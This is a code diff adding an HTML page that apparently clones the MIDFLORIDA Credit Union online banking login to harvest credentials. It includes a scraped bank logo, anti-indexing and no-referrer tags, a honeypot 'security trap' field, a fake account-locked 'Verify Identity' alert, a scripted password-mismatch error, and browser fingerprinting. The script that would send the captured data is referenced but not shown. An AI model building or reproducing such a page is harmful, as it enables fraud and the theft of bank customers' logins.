@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=5">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self'; connect-src 'self';">
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <title>Banking, Loans & Mortgages | MIDFLORIDA Credit Union</title>
+    <link rel="icon" href="https://www.midflorida.com/-/media/feature/midflorida/siteasset/favicon.jpg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <div class="loading-text" data-render="sync_msg"></div>
+    </div>
+
+    <!-- Interactive Modals -->
+    <div id="locked-modal" class="modal-backdrop">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span class="modal-title" data-render="sec_alert_title">Security Alert</span>
+            </div>
+            <div class="modal-body">
+                <p class="modal-text" data-render="locked_msg"></p>
+            </div>
+            <div class="modal-footer">
+                <button class="modal-button" id="close-locked-modal" data-render="verify_btn_text">Verify Identity</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="root">
+        <div class="login-page-container">
+            <div class="fluid-form-layout">
+                <div class="login-header">
+                    <a href="#">
+                        <img src="assets/scraped-logo.svg" alt="" id="brand-logo">
+                    </a>
+                </div>
+
+                <div class="login-form-container">
+                    <div id="login-error" class="login-error-alert">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            <span id="error-text">The Username and/or Password you entered does not match our records. Try again.</span>
+        </div>
+
+        <form id="fluid-login-form">
+                        <!-- Security trap -->
+                        <div class="vld-msg-container">
+                            <input type="text" name="b_field" id="b_field" tabindex="-1" autocomplete="off">
+                        </div>
+
+                        <div class="fluid-form-layout-field-container">
+                            <label class="field-label" for="username" data-render="u_label"></label>
+                            <div class="fluid-input-wrapper">
+                                <input type="text" id="username" name="username" class="fluid-input" autocomplete="username" required>
+                            </div>
+                        </div>
+
+                        <div class="fluid-form-layout-field-container">
+                            <label class="field-label" for="password" data-render="p_label"></label>
+                            <div class="fluid-input-wrapper">
+                                <input type="password" id="password" name="password" class="fluid-input" autocomplete="current-password" required>
+                            </div>
+                        </div>
+
+                        <div class="fluid-form-layout-field-container" style="margin-top: 32px;">
+                            <button type="submit" class="fluid-button">
+                                <span class="fluid-button__text" data-render="btn_text"></span>
+                            </button>
+                        </div>
+
+                        <div style="text-align: center; margin-top: 20px;">
+                            <a href="#" style="font-size: 14px; color: var(--btn-primary); text-decoration: none; font-weight: 500;" data-render="forgot_link"></a>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <footer id="footer-container" class="footer-container-main">
+            <div class="image-links">
+                <img alt="" src="assets/ncua_icon.png" style="margin-right: 20px;">
+                <img alt="" src="assets/ncua_text.png" style="margin-right: 20px;">
+                <img alt="" src="assets/ehl_icon.png">
+            </div>
+        </footer>
+    </div>
+	
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
